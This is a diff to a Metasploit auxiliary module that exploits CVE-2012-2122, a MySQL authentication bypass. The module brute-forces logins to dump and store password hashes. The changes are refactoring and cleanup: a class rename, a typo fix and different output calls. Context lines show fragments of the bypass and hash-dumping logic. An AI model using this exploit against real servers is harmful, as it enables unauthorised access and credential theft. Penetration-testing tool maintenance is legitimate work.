@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MYSQL
   include Msf::Auxiliary::Report
 
@@ -18,11 +15,11 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %Q{
           This module exploits a password bypass vulnerability in MySQL in order
         to extract the usernames and encrypted password hashes from a MySQL server.
-        These hashes ares stored as loot for later cracking.
+        These hashes are stored as loot for later cracking.
       },
       'Author'        => [
           'theLightCosine', # Original hashdump module
-          'jcran'                                              # Authentication bypass bruteforce implementation
+          'jcran' # Authentication bypass bruteforce implementation
         ],
       'References'     => [
           ['CVE', '2012-2122'],
@@ -36,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('PASSWORD')
     register_options( [
       OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
-    ], self.class )
+    ])
   end
 
 
@@ -124,11 +121,11 @@ class Metasploit3 < Msf::Auxiliary
               :socket         => s,
               :db             => nil
               })
-            print_status "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
+            print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << x
           rescue RbMysql::AccessDeniedError
           rescue Exception => e
-            print_status "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
+            print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
           end
         end
 
@@ -177,7 +174,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Create a table to store data
-    tbl = Rex::Ui::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => 'MysQL Server Hashes',
       'Indent'   => 1,
       'Columns' => ['Username', 'Hash']
@@ -209,8 +206,7 @@ class Metasploit3 < Msf::Auxiliary
   def report_hashes(hash_loot,service)
     filename= "#{rhost}-#{rport}_mysqlhashes.txt"
     path = store_loot("mysql.hashes", "text/plain", rhost, hash_loot, filename, "MySQL Hashes", service)
-    print_status("#{rhost}:#{rport} Hash Table has been saved: #{path}")
+    print_good("#{rhost}:#{rport} Hash Table has been saved: #{path}")
 
   end
-
 end
